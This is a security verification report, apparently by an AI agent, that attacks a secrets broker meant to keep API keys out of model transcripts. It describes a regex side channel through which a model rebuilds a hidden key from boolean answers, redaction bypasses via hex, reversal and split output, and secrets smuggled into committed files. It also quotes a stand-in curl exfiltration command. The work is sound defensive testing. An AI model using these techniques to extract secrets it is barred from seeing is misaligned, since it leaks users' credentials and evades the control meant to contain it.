# W2 — Zero-leak adversarial

**Workstream:** VERIFICATION.md §2 W2 · **Severity scale:** VERIFICATION.md §3
**Claim under attack:** a secret value never reaches a model transcript, a log, or any
destination other than its intended sink.
**Method:** throwaway probes under `scripts/probe-w2-*.mjs`, each against a fresh
`mkdtemp` project root containing a `.gitignore` with `.env`. No probe points a broker at
this repository. Existing happy-path tests were not re-run as evidence.

| Probe | Binding attacked |
|---|---|
| `scripts/probe-w2-oracle.mjs` | SDK (`createBroker` + `dispatch`) |
| `scripts/probe-w2-mcp.mjs` | MCP — spawns `packages/mcp-server/dist/bin.js`, records every byte both directions + stderr |
| `scripts/probe-w2-sdk.mjs` | SDK + redactor unit boundaries |
| `scripts/probe-w2-verify.mjs` | `env_verify` against a real HTTPS host that echoes the credential |
| `scripts/probe-w2-http.mjs` | HTTP — every route, body **and** headers |
| `scripts/probe-w2-cli.mjs` | CLI — every command as a real child process |
| `scripts/probe-w2-redact-limit.mjs` | redactor DoS threshold (F9), one child per value length |

**Bottom line:** the sentinel never escaped through a tool result, an HTTP body, an HTTP
header, stderr, or CLI stdout in any of the four bindings. It escaped twice through
**on-disk artifacts** (`env.schema.jsonc`, `.envseal/audit.jsonl`), and — the serious
result — the value can be **reconstructed in full by the model itself** through a
declarative side channel that no redactor sees.

---

## 1. Findings table

### Leak attempts

| # | Attempted escape | Binding | Observed result | Severity |
|---|---|---|---|---|
| F1 | Recover a stored value using only `env_declare` + `env_describe`, by declaring a chosen `format.pattern` and reading back `formatValid` | SDK · MCP · HTTP | **Full 33-char sentinel recovered in 424 tool calls.** No user prompt, no audit record, no rate limit | **Critical** |
| F2 | Value smuggled in `env_declare`'s `description` | all four | **Accepted, written verbatim to `env.schema.jsonc`** — the file PLAN §6.1 commits to git | **High** |
| F3 | Value smuggled in `env_request`'s `reason` | all four | **Accepted, written verbatim to `.envseal/audit.jsonl`** — PLAN §4.1: "names only, no values" | **High** |
| F4 | Value smuggled in `format.example` | all four | Accepted, written verbatim to `env.schema.jsonc` | **High** |
| F5 | `env_use` child prints the value with a newline inserted mid-value | SDK · CLI | **Not redacted.** Both fragments reach the tool result; concatenation recovers the value | **High** |
| F6 | `env_use` child prints the value hex-encoded | SDK · CLI | Not redacted (hex is not in the §7.4 variant list) | Medium |
| F7 | `env_use` child prints the value reversed / as char codes | SDK · CLI | Not redacted | Low |
| F8 | Store a 7-byte value, then have `env_use` echo it | SDK · CLI | **Not redacted**, and nothing rejects a sub-8-byte value at input time, contrary to PLAN §7.4 | Medium |
| F9 | Stored value ≥ ~4000 bytes passed through the redactor | any `redact()` caller | **Uncatchable `FATAL ERROR: RegExpCompiler Allocation failed`, process aborts (exit 134)** | High |
| F10 | Explicit `value` field injected into a declared entry | all four | Rejected — `SEP_VALUE_IN_REQUEST` (`.strict()` holds) | None |
| F11 | Real HTTPS probe (`postman-echo.com`) that echoes the credential in its response body | SDK, real network | `message` is only `HTTP 200 from postman-echo.com`; body never surfaces | None |
| F12 | Probe returns 401/500 echoing the credential in body and headers | SDK (`fetch` stubbed) | `HTTP <status> from <host>` only | None |
| F13 | Probe 302-redirects to another host | SDK | Redirect not followed (`redirect: 'manual'`) | None (misclassified `auth_failed` — Low) |
| F14 | Probe throws a network error whose message embeds the credential | SDK | Passed through `redact()` → `...sending Bearer «redacted»` | None |
| F15 | Prompter throws with the value in `Error.message` | SDK | Swallowed at `broker.ts:331`; ticket → `cancelled` | None |
| F16 | Prompter returns a malformed shape / `entered` with no value | SDK | Ticket → `cancelled`; no leak | None (see F18) |
| F17 | Value fails the declared `format.pattern` | MCP | `invalid_format`; value zeroed at `broker.ts:287` | None |
| F18 | Sink write failure (`.env` read-only) | MCP · CLI | No leak — but ticket → `state: cancelled, keys: []`, indistinguishable from user cancellation; `SEP_SINK_WRITE_FAILED` never surfaces and the value is **not zeroed** on this path | Medium |
| F19 | Malformed JSON-RPC frames: unparseable, empty, id-only, >1 MiB | MCP | Server survives all four and answers the next request | None |
| F20 | Tool name / request body containing the sentinel | MCP · HTTP | Echoed in `Unknown tool: <sentinel>` — reflection of caller input, not stored state | Low |
| F21 | Multi-byte/emoji value; value containing literal `«redacted»`; value of regex metacharacters; all-digit value | redactor | All correctly redacted | None |
| F22 | Two declared values, one containing the other | redactor | Both redacted; longest-first alternation holds | None |
| F23 | 19- vs 20-char prefix of the value | redactor | 19 not redacted, 20 redacted — matches documented `PREFIX_MIN_LENGTH` | None (as specified) |
| F24 | `env_use` child floods past the 1 MiB stdout cap with the value at the end | CLI | Value truncated away entirely; longest surviving raw prefix = 0 chars | None |
| F25 | HTTP: bad token equal to the secret, malformed JSON, raw-secret body, >1 MiB body, schema violation, unknown route, path traversal, `Host`/`Origin` spoof, GET on a POST route | HTTP | 22 exchanges, **0 body leaks, 0 header leaks** | None |
| F26 | CLI: every command incl. corrupt manifest, read-only `.env`, missing binary, no interactive surface | CLI | 20 commands, ~1.05 MB combined stdout+stderr, **0 leaks** (6 consecutive runs) | None |

### Defects found while attacking (not leaks, but they block the guarantee from being exercised)

| # | Defect | Severity |
|---|---|---|
| F27 | `env_use` is unusable in 3 of 4 bindings. MCP (`bin.ts:51`), SDK (`sdk/src/index.ts:20`) and HTTP (`http-server/src/server.ts:57`) construct the `Broker` with no `onConfirm`, so `exec.ts:83-87` always throws `SEP_CONFIRMATION_DENIED`. Only CLI `run` wires it. The MCP E2E suite never calls `env_use`, which is why this was never caught. | High |
| F28 | `envseal verify` **crashes** instead of returning its documented exit code: prints correct JSON, then `Assertion failed: !(handle->flags & UV_HANDLE_CLOSING), file src\win\async.c, line 76`, exit `3221226505` (`0xC0000409`) instead of `6`. Breaks the Tier-4 machine contract (PLAN T7.1). | High |
| F29 | PLAN §6.4's probe-approval consent flow is unreachable dead code. `onApprovalNeeded` is supplied by exactly one place in the repo — `packages/core/test/verify.test.ts:120`. No binding supplies it. **Fail-closed, not a bypass** (`verify.ts:67-74` returns `probe_not_approved` before reaching `fetch` at line 89). | Medium |
| F30 | `ensure` and `set` exit `1` with `{"code":"UNKNOWN","userMessage":"No outcome returned"}` when no interactive surface exists; documented contract is exit `4` / `SEP_NO_INTERACTIVE_SURFACE`. | Medium |
| F31 | `env_use` output is redacted with the unlabelled token `«redacted»`; PLAN §7.4 specifies `«redacted:OPENAI_API_KEY»`. `exec.ts:144-145` calls `redact()` without the `labels` map the function already accepts. | Low |
| F32 | HTTP dispatch errors are all reported as `SEP_UNKNOWN_KEY` / `"An error occurred"` regardless of cause (`sdk/src/index.ts:230-236`); an unknown `/v1/<name>` route returns 200 with an error body rather than 404. | Low |

**Counts:** 1 Critical · 6 High · 6 Medium · 6 Low · 13 None.

---

## 2. Critical and High findings — reproduction and responsible code

### F1 (Critical) — `format.pattern` is a chosen-predicate oracle over the stored value

`env_declare` accepts an arbitrary regex in `format.pattern`
(`packages/protocol/src/schemas.ts:11` — plain `z.string().optional()`, with no
RE2-safe validation despite PLAN §5.5 promising "RE2-safe subset; validated at
declare time"). `env_describe` then evaluates that regex **against the live
stored value** and returns the boolean to the model:

`packages/core/src/broker.ts:105-110`
```ts
let formatValid = true;
if (present && value && entry.format?.pattern) {
  const pattern = new RegExp(entry.format.pattern);
  const valueStr = value.toString('utf8');
  formatValid = pattern.test(valueStr);
}
```

Both tools are non-interactive, unaudited and unlimited, so the model holds an
unlimited chosen-predicate oracle over a value it is not allowed to see. This
falsifies the load-bearing design claim in PLAN §3.1: *"If the model's only verbs
are 'declare that this project needs X' and 'ensure X exists', then no sequence of
model actions can produce a value in the transcript. Safety is structural, not
policed."* A declaration **is** a predicate over the value, and its truth value is
returned to the model.

The redactor is irrelevant here: no secret-derived string ever crosses the wire,
so there is nothing for `redact()` to match. The value is reconstructed in the
model's own context from a sequence of booleans.

Reproduction — `node scripts/probe-w2-oracle.mjs`:
```
--- oracle liveness ---
  present:                 true
  matches ^sk-  :          true
  matches ^zz-  :          false
--- recovering length ---
  recovered length:        33  (actual 33)
--- result ---
  sentinel:   sk-W2SENTINEL-oracle-9c3f1a7b0e5d
  recovered:  sk-W2SENTINEL-oracle-9c3f1a7b0e5d
  EXACT MATCH: true
  tool calls used: 424  (env_declare + env_describe only)
  audit.jsonl lines:       0
  audit mentions the read: false
```

424 calls for 33 characters over a 64-symbol alphabet, by binary search on
character classes (`^<known-prefix>[a-m]`). Length first, by binary search on
`^.{0,n}$`. A 48-char key costs roughly 600 calls. Nothing observes it:
`env_describe` writes no audit record at all, so a compromised session leaves no
trace of the extraction.

Same line is also a ReDoS and timing-oracle surface: `new RegExp(modelSuppliedText)`
is compiled and executed against the secret on every `env_describe`.

**Suggested direction (not applied):** `formatValid` must not be a
model-controllable predicate. Either compute it only against the pattern that was
in the manifest when the value was stored, or drop the field from
`env_describe`'s output, or restrict `format.pattern` to a registry-supplied
pattern id rather than free text.

### F2 / F3 / F4 (High) — free-text fields are never checked for secret-shaped strings

PLAN §2.2 T3 requires: *"Any request whose free-text fields match the
secret-shaped detector is rejected, logged, and surfaced to the user."* That
check does not exist anywhere.

`@envseal/detector` is declared as a dependency of `packages/core/package.json:25`
and `packages/cli/package.json:30` but is **imported by neither**. Its only
consumer in the repo is `plugins/claude-code/hooks/user-prompt-submit.ts:1`, which
guards the *user's chat message* — not the model's tool arguments.

The only T3 control that exists is `.strict()` rejecting an unknown `value` key
(`packages/protocol/src/schemas.ts:40`) — verified working (F10). Everything else
goes straight to disk:

- `description` and `format.example` → `declareEntries` → `saveManifest` →
  `env.schema.jsonc` (`packages/core/src/manifest.ts:87-120`). PLAN §6.1: this
  file is **committed to git**.
- `reason` → `appendAudit(..., reason: input.reason)` at
  `packages/core/src/broker.ts:206-212` → `.envseal/audit.jsonl`.

Reproduction — `node scripts/probe-w2-sdk.mjs`, section 6:
```
  description        ACCEPTED
  format.example     ACCEPTED
  reason             ACCEPTED
  entry.value        rejected: SEP_VALUE_IN_REQUEST
  env.schema.jsonc contains sentinel: true  (this file is COMMITTED to git per PLAN §6.1)
  .envseal/audit.jsonl contains sentinel: true  (PLAN §4.1: "names only, no values")
```

Independently confirmed through the spawned MCP server —
`node scripts/probe-w2-mcp.mjs`, section C:
```
  stdin -> server (all bytes)    bytes= 1052332 sentinelHits=4
  server -> stdout (all bytes)   bytes=    7170 sentinelHits=1
  server stderr (all bytes)      bytes=       0 sentinelHits=0
  --- on-disk artifacts ---
  .env                           sentinelHits=0
  env.schema.jsonc               sentinelHits=1   <-- LEAK
  .envseal/audit.jsonl           sentinelHits=1   <-- LEAK
```
(The single `server -> stdout` hit is F20: the echo of a model-supplied tool name
in `Unknown tool: <sentinel>`, not stored state.)

This is the product's own failure mode one layer up: a model that has a key in
context — hallucinated, pasted into chat earlier, or read from another file —
writes it into a git-tracked artifact while calling the tool whose description
promises values are never stored there.

### F5 (High) — `env_use` output redaction is defeated by any transformation of the value

`packages/core/src/exec.ts:144-145` redacts child stdout/stderr with `redact()`,
whose variant set (`packages/core/src/redact.ts:16-29`) is: the exact string,
base64, base64url, `encodeURIComponent`, JSON-escaping, and every prefix of length
≥ 20. A child that emits the value in any other shape is not covered.

The `env_use` description shown to the model (`packages/sdk/src/index.ts:69`)
states: *"Output is filtered so the values cannot appear in what you read back."*
That is false.

Reproduction — `node scripts/probe-w2-sdk.mjs` section 2, sentinel
`sk-W2SENTINEL-sdk-11112222333344445555`:
```
    plain        plain=«redacted»
    base64       base64=«redacted»
    base64url    base64url=«redacted»
    urlenc       urlenc=«redacted»
    jsonesc      jsonesc=«redacted»
    prefix20     prefix20=«redacted»
    hex          hex=736b2d573253454e54494e454c2d73646b2d3131313132323232333333333434343435353535
    reversed     reversed=55554444333322221111-kds-LENITNES2W-ks
    prefix19     prefix19=sk-W2SENTINEL-sdk-1
    withNewline  withNewline=sk-W2SENTI
                 NEL-sdk-11112222333344445555
    charCodes    charCodes=115,107,45,87,50,83,69,78,84,73,78,69,76,45,115,100,107,45,49,...
```

The `withNewline` row is the one that matters: the value split across a line break
emerges as two raw fragments — `sk-W2SENTI` and `NEL-sdk-11112222333344445555` —
because the second is a *suffix*, and only prefixes are variants. Concatenation
recovers the value exactly.

Confirmed end-to-end through the real CLI binary
(`node scripts/probe-w2-cli.mjs`, `envseal run -- node echo.mjs`):
```
  7-byte value appears in output: true   (redactor floor is 8 bytes)   <- F8
  hex encoding survives:          true                                 <- F6
  newline-split halves both present: true                              <- F5
```

**Why High and not Critical.** Reaching this requires `env_use` with an
`onConfirm` that returns true, and PLAN §2.3 declares "a user who deliberately
runs `env_use -- curl attacker.com -d \"$KEY\"` after reading the confirmation
dialog" an explicit non-goal, with §9.1 naming model-directed `env_use`
exfiltration as the largest known residual hole. What is *not* covered by that
disclaimer, and is the finding here: (a) the tool description promises filtering
that does not hold; (b) no network egress and no second confirmation is needed —
the confirmation dialog shows a benign-looking `node -e` command; (c) §9.1 frames
the residual risk purely as *network* exfiltration, so a reader of the residual-risk
doc would not expect local reconstruction. E8 ("residual-risk doc matches what the
code actually does") is therefore not satisfied.

### F9 (High) — a long stored value aborts the process inside the redactor

`redact()` builds a single alternation containing every prefix of length 20…N of
every live secret (`packages/core/src/redact.ts:25-27`, joined at line 48). The
regex source grows as O(N²): a 4000-byte value produces roughly 8 MB of pattern
text, and V8's regex compiler aborts the process rather than throwing.

Reproduction — `node scripts/probe-w2-redact-limit.mjs` (one child per length,
because the failure is fatal):
```
  bytes   exit  signal  result
    100     0       -  OK count=1 leaked=false
   1000     0       -  OK count=1 leaked=false
   3000     0       -  OK count=1 leaked=false
   3500     0       -  OK count=1 leaked=false
   4000   134       -  FATAL ERROR: RegExpCompiler Allocation failed - process out of memory
   5000   134       -  FATAL ERROR: RegExpCompiler Allocation failed - process out of memory
```
This is a V8 `FATAL ERROR`, not a catchable `SyntaxError` — no `try/catch`
contains it, and the process dies. Every redaction path is affected
(`exec.ts:144`, `verify.ts:149`). The CLI `run` command injects **every present
key** (`packages/cli/src/commands/run.ts:63-65`), so several moderately long
values reach the same limit together.

No value is leaked by this. The guarantee that fails is "refuse rather than
degrade / fail safe, never silently" (PLAN §3.3): the broker dies mid-operation.
A 4 KB value is not exotic — private keys, service-account JSON and session
cookies routinely exceed it.

### F27 (High) — `env_use` is dead in three of four bindings

`packages/core/src/exec.ts:83-87`:
```ts
} else if (!isApproved && !opts?.onConfirm) {
  throw new SepError({ code: 'SEP_CONFIRMATION_DENIED' });
}
```
`onConfirm` is supplied only by `packages/cli/src/commands/run.ts:59`. The other
three bindings construct the broker without it:
`packages/mcp-server/src/bin.ts:51`, `packages/sdk/src/index.ts:20`,
`packages/http-server/src/server.ts:57`.

Observed, MCP (`probe-w2-mcp.mjs`):
```
  env_use output:
    {"code":"SEP_CONFIRMATION_DENIED","userMessage":"The user denied the confirmation.","retriable":false}
```
Observed, HTTP (`probe-w2-http.mjs`) and SDK (`probe-w2-sdk.mjs`): identical.

The tool is advertised in `tools/list` and in the OpenAPI document, and its
description tells the model what it does, but it can never succeed. The message
is also actively misleading: no user was asked and no user denied anything.
`packages/mcp-server/test/` contains no `env_use` case at all, which is why 439
green tests did not catch it.

### F28 (High) — `envseal verify` aborts instead of returning its documented exit code

`packages/cli/src/commands/verify.ts:48` calls `process.exit(EXIT.VERIFY_FAILED)`
while the ticket store's `setInterval` and the just-completed `fetch` handle are
still live; no CLI command calls `broker.dispose()`. On Windows libuv asserts.

Reproduction (3/3 runs):
```
$ envseal verify --project <tmp> --json
{"results":[{"key":"OPENAI_API_KEY","result":"auth_failed","message":"HTTP 401 from api.openai.com"}],"allOk":false}
Assertion failed: !(handle->flags & UV_HANDLE_CLOSING), file src\win\async.c, line 76
   exit=3221226505   (0xC0000409)
```
Documented contract (PLAN T7.1, `docs/cli-contract.md`): `6` verification failed.
An agent parsing exit codes at Tier 4 sees a crash code. No value leaks — the JSON
is emitted before the abort — but output ordering is not guaranteed under an
abort, so a truncated line is possible.

---

## 3. The replacement http-server leak test (U10)

**U10 confirmed.** The original test at `packages/http-server/test/contract.test.ts`
declared `const sentinel = 'sk-SENTINEL-SDK-DO-NOT-LEAK-4f5a6b7c8d9e'` and asserted
two response bodies did not contain it — but the project root was a fresh
`mkdtemp` with no `.env` and no manifest, and no code path ever stored that string
anywhere. The assertions were vacuously true and would have passed against an
implementation that returned every value it held.

The replacement (same file, test renamed *"does not leak a provisioned secret in
any response body or header"*):

1. **Provisions the value first** — writes `.env` and `env.schema.jsonc` into the
   temp root, which is exactly the state the broker leaves after a completed
   `env_request`. (`startHttpServer` accepts no prompter, so this is the only way
   to get a real value into the project.)
2. **Guards against vacuity** — asserts `entry.present === true` with the message
   *"fixture secret must be present, or this test asserts nothing"* before making
   any leak claim.
3. Sweeps **12 exchanges**: `env_describe`, `env_declare`, `env_verify` (reads the
   value and substitutes it into a probe header), `env_use` (reads it and injects
   it into a child env), `openapi.json`, plus the error branches — bad token equal
   to the secret, malformed JSON, raw-secret body, >1 MiB body, schema violation,
   unknown operation — and finally `env_revoke`, run last so every route above saw
   the value present.
4. Asserts on **both** `body` and `rawHeaders` (the helper now captures response
   headers, since a handler that reflects a request header is an egress channel).
5. `env_verify` points at `https://leak-probe.invalid`, a deliberately
   non-allowlisted host, so the route is exercised and fails closed with **no
   network call** — the test stays hermetic.

Output:
```
 RUN  v2.1.9 D:/dev/Experiments/env/packages/http-server
 ✓ test/contract.test.ts (9 tests) 333ms
 Test Files  1 passed (1)
      Tests  9 passed (9)
```

**Mutation check** (required by VERIFICATION.md §0 — a green test is not evidence).
`packages/core/dist/broker.js` `describe()` was temporarily patched to emit
`value: value.toString('utf8')` in each `KeyStatus`. The new test went red with a
precise message:
```
 × HTTP Server Contract > does not leak a provisioned secret in any response body or header
   → secret leaked in env_describe body: expected '{"projectRoot":"C:\\Users\\ASUS~1\\Ap…'
     not to contain 'sk-U10SENTINEL-http-3b7d41f9e2c85a06'
 Test Files  1 failed (1)
      Tests  1 failed | 8 passed (9)
```
The artifact was then restored and verified byte-identical against a backup
(`diff` clean), and the suite returned to 9/9 green. The old test, given the same
mutation, would still have passed.

---

## 4. Four-binding sentinel sweep

| Egress point | MCP | SDK | HTTP | CLI |
|---|---|---|---|---|
| Tool results / response bodies | clean (7 170 B recorded) | clean (11 dispatch results) | clean (22 exchanges) | clean (20 commands, 1.05 MB) |
| Response headers | n/a | n/a | clean (`rawHeaders` swept) | n/a |
| stderr | clean (0 bytes emitted) | clean | n/a | clean |
| Thrown errors / error messages | clean — non-`SepError` replaced by a fixed string (`respond.ts:49-60`) | clean | clean | clean |
| `env_use` child output | unreachable (F27) | leaks under transformation (F5/F6/F8) | unreachable (F27) | leaks under transformation (F5/F6/F8) |
| `env_verify` result messages | clean | clean (real HTTPS echo host, F11) | clean | clean |
| `.env` (intended sink) | value present — **correct** | correct | correct | correct |
| `env.schema.jsonc` | **LEAK via `description` / `format.example` (F2/F4)** | LEAK | LEAK | LEAK |
| `.envseal/audit.jsonl` | **LEAK via `reason` (F3)** | LEAK | LEAK | LEAK |
| `.envseal/approvals.json` | clean (never written — F29) | clean | clean | clean |
| `.envseal/salt` | clean | clean | clean | clean |
| Statusline cache | clean — `plugins/claude-code/statusline/statusline.ts:41-46` stores only `{root, lastAt, count, output}`; `countMissing` never reads a value | — | — | — |
| Declarative side channel | **F1 — full value reconstructable** | **F1** | **F1** | n/a (no `--json` predicate surface) |

`.envseal/approvals.json` is clean for the wrong reason: it is never written,
because nothing supplies `onApprovalNeeded` (F29). When the callback *is* supplied
(`probe-w2-verify.mjs`), the file is written and was swept clean:
```
--- artifact sweep ---
  .env (intended sink)       sentinel=true
  env.schema.jsonc           sentinel=false
  .envseal/audit.jsonl       sentinel=false
  .envseal/approvals.json    sentinel=false
```

### Real-HTTPS credential-echo result (F11)

`postman-echo.com` reflects every request header into its response body, which
reproduces the real provider behaviour PLAN §5.1 warns about, using a genuine TLS
connection. `verify.ts:31` hard-requires `https://`, so a plain local HTTP server
cannot reach the network path at all.

```
--- confirm the remote really does echo the credential ---
  direct fetch status=200 bodyContainsSentinel=true
--- first verify: novel host, approval callback supplied ---
  [{"key":"ECHO_KEY","result":"auth_failed","message":"HTTP 200 from postman-echo.com",...}]
  approval callback invoked: 1 time(s)
  result leaks sentinel: false
--- second verify: approval now recorded, no callback needed ---
  result leaks sentinel: false
--- same host, no approval callback and no recorded approval ---
  [{"key":"ECHO_KEY","result":"probe_not_approved","message":"Probe to postman-echo.com requires approval",...}]
  -> fail-closed (no probe sent): true
```
The remote demonstrably had the credential in its response body, and none of it
reached `VerifyResult.message`. `verify.ts` never touches `response.body` or
`response.headers` — only `response.status` and the pre-computed hostname. This is
correct by construction, and now verified against a real server rather than a stub.

---

## 5. What I could NOT test, and why

1. **A locally hosted HTTPS probe with a self-signed certificate.** Certificate
   generation was denied by a local security hook (the command names a private
   key file). I did not work around the denial. Covered instead by (a) a real
   remote HTTPS host that genuinely echoes the credential (F11, above) and (b) a
   stubbed `globalThis.fetch` injected at the exact `verify.ts:89` call site for
   the 500 / 401 / 302 / throw branches (F12–F14). Everything downstream of the
   response object is real code; what is *not* covered is undici's own TLS error
   strings, which could in principle differ from the `Error` I injected.

2. **`env_use` through the MCP and HTTP bindings.** Blocked by F27 — the tool
   always returns `SEP_CONFIRMATION_DENIED` there. F5/F6/F8 were therefore proven
   through the SDK and the real CLI binary only. If `onConfirm` is later wired into
   MCP, those findings must be re-checked on that path.

3. **The `keychain`, `sops`, `onepassword`, `doppler` and `vault` sinks.** All
   probes used the `dotenv` sink. A value that reaches the OS credential store is
   outside what I exercised (VERIFICATION U3).

4. **The loopback-browser prompter's rendered page.** All probes forced `CI=1` or
   an injected stub prompter so no browser window would open. The HTML page's own
   egress (CSP, `reason` rendering, form field attributes) is W3's surface, not
   swept here. VERIFICATION U1 stands.

5. **A real harness transcript on disk.** PLAN T8.4 requires grepping a live
   Claude Code session file for the sentinel. I recorded every byte of the MCP
   stdio channel, which is what the harness would persist, but I did not run a
   live session. VERIFICATION U5/U8 and gate M4 stand. F1 in particular would not
   be caught by such a grep — the value never crosses the wire; it is reassembled
   from booleans inside the model's context.

6. **Non-Windows platforms.** Everything ran on Windows 11 / Node 24.14.1. F28 is
   a Windows-specific libuv assertion and may present differently elsewhere; F9's
   crash threshold (~3500–4000 bytes) is V8-version dependent. VERIFICATION U9
   stands.

7. **Concurrency.** No probe ran two brokers against one project root, and none
   killed a process mid-write. That is W7's scope.

8. **One non-reproducing observation, recorded for honesty.** The first successful
   CLI probe run reported `leak=true` for `status --json`. It did not reproduce in
   six subsequent runs, nor in an isolated minimal repro, and I could find no code
   path by which `status --json` could emit a value — it serialises only
   `key`, `present`, `sink`, `formatValid`, `lengthBucket`, `fingerprint`,
   `lastVerified`, `verifyResult` (`packages/cli/src/commands/status.ts:31-42`).
   I attribute it to residual state from the immediately preceding broken run of my
   own harness, but I could not prove that, so it is logged as **unverified**
   rather than dismissed or reported as a finding.

---

## 6. Effect on the launch exit criteria

- **E2 (zero-leak holds under adversarial attempt): NOT MET.** F1 is a complete
  recovery of a stored value by the model, through the tool surface, using no
  redactable string.
- **E3 (no Critical or High open): NOT MET.** 1 Critical, 6 High.
- **E8 (residual-risk doc matches the implementation): NOT MET.** §9 does not
  mention the declarative oracle (F1), and frames `env_use` risk as network
  exfiltration only, not local reconstruction (F5).

## 7. Working-tree changes

Product code: **none changed.**

- Added: `scripts/probe-w2-oracle.mjs`, `probe-w2-mcp.mjs`, `probe-w2-sdk.mjs`,
  `probe-w2-verify.mjs`, `probe-w2-http.mjs`, `probe-w2-cli.mjs`,
  `probe-w2-redact-limit.mjs`.
- Modified: `packages/http-server/test/contract.test.ts` — replaced the vacuous
  U10 leak test, and extended the local `httpRequest` helper to capture
  `rawHeaders` and accept a `rawBody`. No existing assertion was weakened or
  removed.
- Added: this document.
- `packages/core/dist/broker.js` was temporarily mutated for the mutation check in
  §3 and restored byte-identical (verified by `diff`).

### Test-suite state after the change

Every package my change could affect is green:
```
core        : Tests  130 passed (130)
sdk         : Tests   11 passed  (11)
mcp-server  : Tests   22 passed  (22)
cli         : Tests   19 passed  (19)
http-server : Tests    9 passed   (9)
```
`pnpm -r test` as a whole is **red for reasons outside this workstream**. The tree
carries concurrent edits from other workstreams — `git status` shows
`packages/prompters/src/loopback.ts` and eight test files modified by others — and
`packages/prompters/test/loopback.test.ts` fails 2 tests on the `Origin` header
("accepts the same-origin Origin header a browser actually sends"), which is W3's
in-flight work on `loopback.ts`, not mine.

One further observation: on the first full run,
`packages/core/test/dotenv.test.ts > throws SEP_GITIGNORE_UNSAFE when file is
git-tracked` failed, then passed 3/3 in isolation and 130/130 in the package run.
It is **flaky under parallel load**, consistent with the Windows rename race that
`renameOverwrite` already retries for (`packages/core/src/sinks/dotenv.ts:199-230`) —
the 300-run `fast-check` property test runs immediately before it. Worth a look
from W4/W7; it is not caused by anything in this workstream.
